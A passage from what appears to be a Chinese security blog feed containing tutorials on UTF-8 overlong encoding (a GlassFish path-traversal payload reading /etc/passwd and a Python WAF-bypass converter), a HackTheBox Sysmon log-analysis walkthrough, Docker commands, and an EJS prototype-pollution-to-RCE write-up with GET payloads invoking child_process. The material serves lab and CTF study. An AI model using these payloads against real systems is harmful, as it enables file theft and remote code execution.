<th align="center">Byte 2</th>
<th align="center">Byte 3</th>
<th align="center">Byte 4</th>
</tr>
</thead>
<tbody><tr>
<td align="center">U+0000</td>
<td align="center">U+007F</td>
<td align="center">0xxxxxxx</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">U+0080</td>
<td align="center">U+07FF</td>
<td align="center">110xxxxx</td>
<td align="center">10xxxxxx</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">U+0800</td>
<td align="center">U+FFFF</td>
<td align="center">1110xxxx</td>
<td align="center">10xxxxxx</td>
<td align="center">10xxxxxx</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">U+10000</td>
<td align="center">U+10FFFF</td>
<td align="center">11110xxx</td>
<td align="center">10xxxxxx</td>
<td align="center">10xxxxxx</td>
<td align="center">10xxxxxx</td>
</tr>
</tbody></table>
<p>举个例子，欧元符号€的unicode编码是U+20AC，按照如下方法将其转换成UTF-8编码</p>
<ol>
<li><p>首先，因为<code>U+20AC</code>是位于<code>U+0800</code>和<code>U+FFFF</code>之间的，所以由上图可知其UTF-8编码长度为3</p>
</li>
<li><p><code>U+20AC</code>的二进制表示为<code>10 0000 1010 1100</code>，将其从右到左分成4，6，6三组(第一组长度不足4要补0)就变成<code>0010 000010 101100</code>。</p>
</li>
<li><p>按照图表中的编码方式，分别在三组添加前缀后结果为<code>11100010 10000010 10101100</code>，对应的就是<code>\xE2\x82\xAC</code></p>
<p><img src="/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20240331111429771.png"></p>
</li>
<li><p>而<code>\xE2\x82\xAC</code>即为欧元符号<code>€</code>的UTF-8编码</p>
</li>
</ol>
<h2 id="Overlong-Encoding造成什么问题"><a href="#Overlong-Encoding造成什么问题" class="headerlink" title="Overlong Encoding造成什么问题"></a>Overlong Encoding造成什么问题</h2><blockquote>
<p>Overlong Encoding就是将1个字节的字符，按照UTF-8编码方式强行编码成2位以上UTF-8字符的方法。</p>
</blockquote>
<p>举个例子，点号<code>.</code>的Unicode编码和ascii编码一致，均为<code>0x2E</code>。按照上表它只能被编码成单字节的UTF-8字符，但是如果按照下面方式去转换：</p>
<ol>
<li><code>0x2E</code>的二进制为<code>10 1110</code>，在前面补5个0变成<code>00000101110</code></li>
<li>将其分成5位、6位两组：<code>00000</code>，<code>101110</code></li>
<li>按照在<code>U+0080</code>到<code>U+07FF</code>区间编码方式，分别给这两组增加前缀<code>110</code>，<code>10</code>，结果是<code>11000000</code>，<code>10101110</code>，对应的是<code>\xC0\xAE</code></li>
</ol>
<p><code>0xC0AE</code>并不是一个合法的UTF-8字符，但我们确实是按照UTF-8编码方式将其转换出来的，这就是UTF-8设计中的一个缺陷。按照UTF-8的规范来说，我们应该使用字符可以对应的最小字节数来表示这个字符。那么对于点号来说，就应该是0x2e。但UTF-8编码转换的过程中，并没有限制往前补0，导致转换出了非法的UTF-8字符。</p>
<p><strong>这种攻击方式就叫“Overlong Encoding”。</strong></p>
<p>很多语言都对此攻击方式做出限制，如python想将<code>0xC0AE</code>转换成点号，就会抛出异常</p>
<p><img src="/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20240331112900764.png"></p>
<p>而在java中很多地方却并没有对其进行防御，因此导致安全漏洞。</p>
<h2 id="GlassFish-任意文件读取漏洞"><a href="#GlassFish-任意文件读取漏洞" class="headerlink" title="GlassFish 任意文件读取漏洞"></a>GlassFish 任意文件读取漏洞</h2><blockquote>
<p>GlassFish在解码URL时，没有考虑UTF-8 Overlong Encoding攻击，导致将<code>%c0%ae</code>解析为ASCCII字符的<code>.</code>（点）。利用<code>%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/</code>来向上跳转，达到目录穿越、任意文件读取的效果。</p>
</blockquote>
<p>我们用<a href="https://github.com/vulhub/vulhub/tree/master">vulhub</a>的靶场复现一下</p>
<p>这个漏洞就是在URL中使用<code>%C0%AE</code>来代替点号<code>.</code>，绕过目录穿越的限制，导致任意文件读取</p>
<p>payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</span><br></pre></td></tr></table></figure>

<p>可以发现成功读取<code>/etc/passwd</code></p>
<p><img src="/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20240331113329452.png"></p>
<h2 id="利用Overlong-Encoding绕过WAF"><a href="#利用Overlong-Encoding绕过WAF" class="headerlink" title="利用Overlong Encoding绕过WAF"></a>利用Overlong Encoding绕过WAF</h2><p><strong>绕过原理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java在反序列化时使用ObjectInputStream类，这个类实现了DataInput接口，这个接口定义了读取字符串的方法readUTF。在解码中，Java实际实现的是一个魔改过的UTF-8编码，名为“Modified UTF-8”(只使用三个字节来表示)。并且其三字节以内的转换过程是和UTF-8相同的，所以仍然继承了“Overlong Encoding”缺陷。</span><br></pre></td></tr></table></figure>

<p>将ASCII字符串转换成Overlong Encoding的UTF-8编码，python脚本如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def convert_int(i: int) -&gt; bytes:</span><br><span class="line">    b1 = ((i &gt;&gt; 6) &amp; 0b11111) | 0b11000000</span><br><span class="line">    b2 = (i &amp; 0b111111) | 0b10000000</span><br><span class="line">    return bytes([b1, b2])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def convert_str(s: str) -&gt; bytes:</span><br><span class="line">    bs = b&#x27;&#x27;</span><br><span class="line">    for ch in s.encode():</span><br><span class="line">        bs += convert_int(ch)</span><br><span class="line">	</span><br><span class="line">	return bs</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(convert_str(&#x27;.&#x27;)) # b&#x27;\xc0\xae&#x27;</span><br><span class="line">    print(convert_str(&#x27;org.example.Evil&#x27;)) # b&#x27;\xc1\xaf\xc1\xb2\xc1\xa7\xc0\xae\xc1\xa5\xc1\xb8\xc1\xa1\xc1\xad\xc1\xb0\xc1\xac\xc1\xa5\xc0\xae\xc1\x85\xc1\xb6\xc1\xa9\xc1\xac&#x27;</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<p><img src="/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20240331113844349.png"></p>
<p>总结一下，在java环境下可以利用Overlong Encoding绕过waf的限制，使得我们可以执行恶意代码。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Unit42-HackTheBox</title>
    <url>/article/Unit42-HackTheBox.html</url>
    <content><![CDATA[<p>Windows系统日志分析</p>
<span id="more"></span>



<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
<p>在本次 Sherlock 中，您将熟悉 Sysmon 日志和各种有用的 EventID，用于识别和分析 Windows 系统上的恶意活动。 Palo  Alto 的 Unit42 最近对 UltraVNC 活动进行了研究，其中攻击者利用 UltraVNC  的后门版本来维持对系统的访问。该实验室受到该活动的启发，并指导参与者完成该活动的初始访问阶段。</p>
</blockquote>
<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>事件 ID 为 11 的事件日志有多少个？</strong></p>
<p>在右边任务栏的筛选日志，添加筛选ID</p>
<p><img src="/article/Unit42-HackTheBox/image-20240421232853013.png"></p>
<p>筛选后在最上面一行显示总共56个</p>
<p><img src="/article/Unit42-HackTheBox/image-20240421232830997.png"></p>
<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>每当在内存中创建一个进程时，都会记录一个事件 ID 为 1  的事件，其中包含命令行、哈希值、进程路径、父进程路径等详细信息。这些信息对于分析人员来说非常有用，因为它允许我们查看所有程序在系统上执行，这意味着我们可以发现正在执行的任何恶意进程。感染受害者系统的恶意进程是什么？</strong></p>
<p>我们先筛选事件1，然后找到如下信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\SysWOW64\msiexec.exe</span><br><span class="line">5.0.19041.3636 (WinBuild.160101.0800)</span><br><span class="line">Windows® installer</span><br><span class="line">Windows Installer - Unicode</span><br><span class="line">Microsoft Corporation</span><br><span class="line">msiexec.exe</span><br><span class="line">&quot;C:\Windows\system32\msiexec.exe&quot; /i &quot;C:\Users\CyberJunkie\AppData\Roaming\Photo and Fax Vn\Photo and vn 1.1.2\install\F97891C\main1.msi&quot; AI_SETUPEXEPATH=C:\Users\CyberJunkie\Downloads\Preventivo24.02.14.exe.exe SETUPEXEDIR=C:\Users\CyberJunkie\Downloads\ EXE_CMD_LINE=&quot;/exenoupdates  /forcecleanup  /wintime 1707880560  &quot; AI_EUIMSI=&quot;&quot;</span><br><span class="line">C:\Users\CyberJunkie\Downloads\</span><br><span class="line">DESKTOP-887GK2L\CyberJunkie</span><br><span class="line">EV_RenderedValue_13.00</span><br><span class="line">1814183</span><br><span class="line">1</span><br><span class="line">Medium</span><br><span class="line">SHA1=9AB9B12901E1EA2DF943B45AD20D8732618608CD,MD5=898277AC5894C4E1412A49040053B0D3,SHA256=445A2E800DC68DF89ABF713F3B4B632D40AE6310EF3660B42D974BB582426BC5,IMPHASH=E4E40938E4BF6C66424859ED02171C41</span><br><span class="line">EV_RenderedValue_18.00</span><br><span class="line">10672</span><br><span class="line">C:\Users\CyberJunkie\Downloads\Preventivo24.02.14.exe.exe</span><br><span class="line">&quot;C:\Users\CyberJunkie\Downloads\Preventivo24.02.14.exe.exe&quot; </span><br><span class="line">DESKTOP-887GK2L\CyberJunkie</span><br></pre></td></tr></table></figure>

<p>大概意思是使用<code>msiexec.exe</code>命令行工具安装一个MSI软件包，并设置了一些环境变量。但是我们注意到<code>Preventivo24.02.14.exe.exe</code>文件，去google搜一下发现是恶意程序，所以本题答案为<code>C:\Users\CyberJunkie\Downloads\Preventivo24.02.14.exe.exe</code></p>
<p><img src="/article/Unit42-HackTheBox/image-20240421234156127.png"></p>
<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>哪个云驱动器被用来分发恶意软件？</strong></p>
<p>我们按照时间排序，在刚刚恶意程序前的时间去找，找到恶意程序在火狐浏览器下的</p>
<p><img src="/article/Unit42-HackTheBox/image-20240421235246213.png"></p>
<p>再往前推，在第一行事件22注意到出现的<code>uc2f030016253ec53f4953980a4e.dl.dropboxusercontent.com</code></p>
<p>相关搜索了解到dropbox是一种云存储服务</p>
<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>初始恶意文件在磁盘上创建的许多文件都带有时间戳（一种防御规避技术，更改文件创建日期以使其看起来很旧）。 PDF 文件的时间戳更改为多少？</strong></p>
<p>直接搜索pdf，找到更改时间</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建的UTC时间（CreationUtcTime）：2024年1月14日08:10:06.029</span><br><span class="line">上一个创建的UTC时间（PreviousCreationUtcTime）：2024年2月14日03:41:58.404</span><br></pre></td></tr></table></figure>

<p>所以答案为<code>2024-01-14 08:10:06</code></p>
<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>恶意文件在磁盘上删除了一些文件。 “once.cmd”在磁盘上的何处创建？请回答完整路径和文件名。</strong></p>
<p>直接搜就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\CyberJunkie\AppData\Roaming\Photo and Fax Vn\Photo and vn 1.1.2\install\F97891C\WindowsVolume\Games\once.cmd</span><br></pre></td></tr></table></figure>

<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>恶意文件尝试到达虚拟域，很可能是为了检查互联网连接状态。它尝试连接到哪个域名？</strong></p>
<p>翻一下就找到了</p>
<p><img src="/article/Unit42-HackTheBox/image-20240422001612820.png"></p>
<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>恶意进程尝试访问哪个 IP 地址？</strong></p>
<p>还是继续顺着时间往后翻，找到目的ip为<code>93.184.216.34</code></p>
<p><img src="/article/Unit42-HackTheBox/image-20240422001731797.png"></p>
<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>该恶意进程在使用 UltraVNC 后门变体感染 PC 后自行终止。该进程何时终止？</strong></p>
<p>往后翻可以在事件5找到恶意进程</p>
<p><img src="/article/Unit42-HackTheBox/image-20240422002202572.png"></p>
<h1 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h1><table>
<thead>
<tr>
<th>Time (UTC)</th>
<th>Description</th>
<th>Reference</th>
</tr>
</thead>
<tbody><tr>
<td>2024-02-14T03:41:26.4</td>
<td>Firefox DNS 查询 Dropbox</td>
<td>DNS (22)</td>
</tr>
<tr>
<td>2024-02-14T03:41:26.5</td>
<td>火狐恶意软件下载</td>
<td>文件创建 (11)</td>
</tr>
<tr>
<td>2024-02-14T03:41:30.4</td>
<td>Windows 将恶意软件标记为已下载</td>
<td>文件创建 (11)</td>
</tr>
<tr>
<td>2024-02-14T03:41:45.8</td>
<td>Firefox DNS 查询 Dropbox</td>
<td>DNS (22)</td>
</tr>
<tr>
<td>2024-02-14T03:41:56.6</td>
<td><code>Preventivo24.02.14.exe.exe</code> 已启动</td>
<td>流程创建 (1)</td>
</tr>
<tr>
<td>2024-02-14T03:41:57.9</td>
<td>恶意软件启动 <code>msiexec</code></td>
<td>流程创建 (1)</td>
</tr>
<tr>
<td>2024-02-14T03:41:58.4</td>
<td>恶意软件将文件写入磁盘</td>
<td>文件创建 (11)</td>
</tr>
<tr>
<td>2024-02-14T03:41:58.4</td>
<td>恶意软件对 15 个文件进行时间戳记。</td>
<td>时间修改 (2)</td>
</tr>
<tr>
<td>2024-02-14T03:41:58.6</td>
<td>恶意软件连接到 93.184.216.34</td>
<td>Network (3)</td>
</tr>
<tr>
<td>2024-02-14T03:41:58.8</td>
<td><code>www.example.com</code> 的恶意软件 DNS 查询</td>
<td>DNS (22)</td>
</tr>
<tr>
<td>2024-02-14 03:41:58.8</td>
<td>恶意软件自行终止</td>
<td>进程终止 (5)</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日志分析</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>docker</title>
    <url>/article/docker.html</url>
    <content><![CDATA[<p>docker搭建环境的基本命令</p>
<span id="more"></span>

<h1 id="docker部署"><a href="#docker部署" class="headerlink" title="docker部署"></a>docker部署</h1><p>启动docker</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure>

<p>首先在题目附件中带有dockerfile的目录打开终端，如</p>
<p><img src="/article/docker/image-20231126144440949.png"></p>
<p>然后输入下面命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t paywall .</span><br></pre></td></tr></table></figure>

<p>接着查看是否启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p><img src="/article/docker/image-20231126144606567.png"></p>
<p>然后创建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -i -d -P paywall</span><br></pre></td></tr></table></figure>

<p>ps查看，发现成功</p>
<p><img src="/article/docker/image-20231126144706256.png"></p>
<p><strong>注意dockerfile的文件路径是否正确</strong></p>
<p>复现完题目后，先删除容器再删除镜像，依次执行如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop 578677ecd7e9</span><br><span class="line">docker rm 578677ecd7e9</span><br><span class="line">docker rmi ezrce</span><br></pre></td></tr></table></figure>









<h2 id="容器使用"><a href="#容器使用" class="headerlink" title="容器使用"></a>容器使用</h2><p>如果我们本地没有 ubuntu 镜像，我们可以使用 docker pull 命令来载入 ubuntu 镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li><strong>-i</strong>: 交互式操作。</li>
<li><strong>-t</strong>: 终端。</li>
<li><strong>ubuntu</strong>: ubuntu 镜像。</li>
<li><strong>&#x2F;bin&#x2F;bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 &#x2F;bin&#x2F;bash。</li>
</ul>
<p><img src="/article/docker/image-20230904231622958.png"></p>
<p>如果退出终端，直接输入 exit</p>
<p>查看所有的容器命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<p><img src="/article/docker/image-20230904231912177.png"></p>
<p>启动一个已停止的容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker start 7f840622fe25</span><br></pre></td></tr></table></figure>

<p><img src="/article/docker/image-20230904233049365.png"></p>
<p>停止容器的命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop 7f840622fe25</span><br></pre></td></tr></table></figure>



<h2 id="exec-命令"><a href="#exec-命令" class="headerlink" title="exec 命令"></a>exec 命令</h2><p>下面演示了使用 docker exec 命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it 7f840622fe25 /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/article/docker/image-20230904233037481.png"></p>
<h2 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a>cp命令</h2><p>将主机&#x2F;www&#x2F;runoob目录拷贝到容器96f7f14e99ab的&#x2F;www目录下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp /www/runoob 96f7f14e99ab:/www/</span><br></pre></td></tr></table></figure>

<p>将主机&#x2F;www&#x2F;runoob目录拷贝到容器96f7f14e99ab中，目录重命名为www。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp /www/runoob 96f7f14e99ab:/www</span><br></pre></td></tr></table></figure>

<p>将容器96f7f14e99ab的&#x2F;www目录拷贝到主机的&#x2F;tmp目录中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp  96f7f14e99ab:/www /tmp/</span><br></pre></td></tr></table></figure>



<h1 id="docker-compose部署"><a href="#docker-compose部署" class="headerlink" title="docker-compose部署"></a>docker-compose部署</h1><p>主要用于vulhub靶场搭建，进入到漏洞目录对靶场进行编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br></pre></td></tr></table></figure>

<p>然后运行此靶场</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>查看启动环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure>

<p>关闭靶场环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title>ejs默认配置之原型链污染</title>
    <url>/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.html</url>
    <content><![CDATA[<p>ejs默认配置造成原型链污染</p>
<span id="more"></span>

<h1 id="ejs默认配置之原型链污染"><a href="#ejs默认配置之原型链污染" class="headerlink" title="ejs默认配置之原型链污染"></a>ejs默认配置之原型链污染</h1><p><a href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce#sspp_gadget">参考文章</a></p>
<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>EJS维护者对原型链污染的问题有着很好的理解，并使用非常安全的函数清理他们创建的每个对象</p>
<p>利用<code>Render()</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exports.render = function (template, d, o) &#123;</span><br><span class="line">    var data = d || utils.createNullProtoObjWherePossible();</span><br><span class="line">    var opts = o || utils.createNullProtoObjWherePossible();</span><br><span class="line"></span><br><span class="line">    // No options object -- if there are optiony names</span><br><span class="line">    // in the data, copy them to options</span><br><span class="line">    if (arguments.length == 2) &#123;</span><br><span class="line">        utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return handleCache(opts, template)(data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>以及<code>createNullProtoObjWherePossible()</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exports.createNullProtoObjWherePossible = (function () &#123;</span><br><span class="line">    if (typeof Object.create == &#x27;function&#x27;) &#123;</span><br><span class="line">        return function () &#123;</span><br><span class="line">            return Object.create(null);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!(&#123;__proto__: null&#125; instanceof Object)) &#123;</span><br><span class="line">        return function () &#123;</span><br><span class="line">            return &#123;__proto__: null&#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Not possible, just pass through</span><br><span class="line">    return function () &#123;</span><br><span class="line">        return &#123;&#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考文章是这么说的，分析上述代码，可以知道不能滥用原型链污染库内新创建的对象。因此，对于用户提供的对象来说情况并非如此，从 EJS 维护者的角度来看，用户向库提供的输入不是 EJS 的责任。</p>
</blockquote>
<p>如何理解呢，就是说我们提供的可以被污染的对象并不会遭到上述函数清理。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>渲染模板时ejs 动态创建函数，该函数将使用<strong>传递给它的数据</strong>组装模板。该函数是根据模板动态创建的字符串编译的。所有这些都发生在最终被调用的 Template 类的编译函数中，在这种情况下，当创建模板对象时，将使用受感染的选项。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exports.compile = function compile(template, opts) &#123;</span><br><span class="line">    var templ;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    templ = new Template(template, opts);</span><br><span class="line">    return templ.compile();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>现在我们知道可以控制配置对象的原型后，那么就可以进一步利用</p>
<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106161658664.png"></p>
<p>我们已经知道当编译模板时，它会使用多个配置元素来处理模板中的代码片段，并将其转换为可执行的 JavaScript 函数。这些配置元素可能包括模板标签、控制流语句、输出语句等。不过其中大多数都使用<code>_JS_IDENTIFIER</code> 正则表达式进行清理</p>
<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106162305462.png"></p>
<p>但是并不意味着所有都会被正则清理，我们看向下面代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compile: function () &#123;</span><br><span class="line">    /** @type &#123;string&#125; */</span><br><span class="line">    var src;</span><br><span class="line">    /** @type &#123;ClientFunction&#125; */</span><br><span class="line">    var fn;</span><br><span class="line">    var opts = this.opts;</span><br><span class="line">    var prepended = &#x27;&#x27;;</span><br><span class="line">    var appended = &#x27;&#x27;;</span><br><span class="line">    /** @type &#123;EscapeCallback&#125; */</span><br><span class="line">    var escapeFn = opts.escapeFunction;</span><br><span class="line">    /** @type &#123;FunctionConstructor&#125; */</span><br><span class="line">    var ctor;</span><br><span class="line">    /** @type &#123;string&#125; */</span><br><span class="line">    var sanitizedFilename = opts.filename ? JSON.stringify(opts.filename) : &#x27;undefined&#x27;;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    if (opts.client) &#123;</span><br><span class="line">      src = &#x27;escapeFn = escapeFn || &#x27; + escapeFn.toString() + &#x27;;&#x27; + &#x27;\n&#x27; + src;</span><br><span class="line">      if (opts.compileDebug) &#123;</span><br><span class="line">        src = &#x27;rethrow = rethrow || &#x27; + rethrow.toString() + &#x27;;&#x27; + &#x27;\n&#x27; + src;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    return returnedFn;</span><br></pre></td></tr></table></figure>

<p>我们可以知道将<code>opts.escapeFunction</code>赋值给<code>escapeFn</code>，如果<code>opts.client</code>存在，那么<code>escapeFn</code>就会在函数体内从而被调用</p>
<p>由于 opts.client 和 opts.escapeFunction 默认情况下未设置，因此可以原型链污染它们到达eval接收器并实现RCE</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__proto__&quot;: &#123;</span><br><span class="line">        &quot;client&quot;: 1,</span><br><span class="line">        &quot;escapeFunction&quot;: &quot;JSON.stringify; process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Setup app</span><br><span class="line">const express = require(&quot;express&quot;);</span><br><span class="line">const app  = express();</span><br><span class="line">const port = 3000;</span><br><span class="line"></span><br><span class="line">// Select ejs templating library</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">// Routes</span><br><span class="line">app.get(&quot;/&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    res.render(&quot;index&quot;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(&quot;/vuln&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    // simulate SSPP vulnerability</span><br><span class="line">    var a = req.query.a;</span><br><span class="line">    var b = req.query.b;</span><br><span class="line">    var c = req.query.c;</span><br><span class="line"></span><br><span class="line">    var obj = &#123;&#125;;</span><br><span class="line">    obj[a][b] = c;</span><br><span class="line"></span><br><span class="line">    res.send(&quot;OK!&quot;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// Start app</span><br><span class="line">app.listen(port, () =&gt; &#123;</span><br><span class="line">    console.log(`App listening on port $&#123;port&#125;`)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>GET传参payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一次: /vuln?a=__proto__&amp;b=escapeFunction&amp;c=JSON.stringify; process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)</span><br><span class="line">第二次: /vuln?a=__proto__&amp;b=client&amp;c=true</span><br></pre></td></tr></table></figure>

<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106163117582.png"></p>
<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p><strong>[SEETF 2023]Express JavaScript Security</strong></p>
<p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const ejs = require(&#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">const BLACKLIST = [</span><br><span class="line">    &quot;outputFunctionName&quot;,</span><br><span class="line">    &quot;escapeFunction&quot;,</span><br><span class="line">    &quot;localsName&quot;,</span><br><span class="line">    &quot;destructuredLocals&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    return res.render(&#x27;index&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/greet&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    </span><br><span class="line">    const data = JSON.stringify(req.query);</span><br><span class="line"></span><br><span class="line">    if (BLACKLIST.find((item) =&gt; data.includes(item))) &#123;</span><br><span class="line">        return res.status(400).send(&#x27;Can you not?&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return res.render(&#x27;greet&#x27;, &#123;</span><br><span class="line">        ...JSON.parse(data),</span><br><span class="line">        cache: false</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(3000, () =&gt; &#123;</span><br><span class="line">    console.log(&#x27;Server listening on port 3000&#x27;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

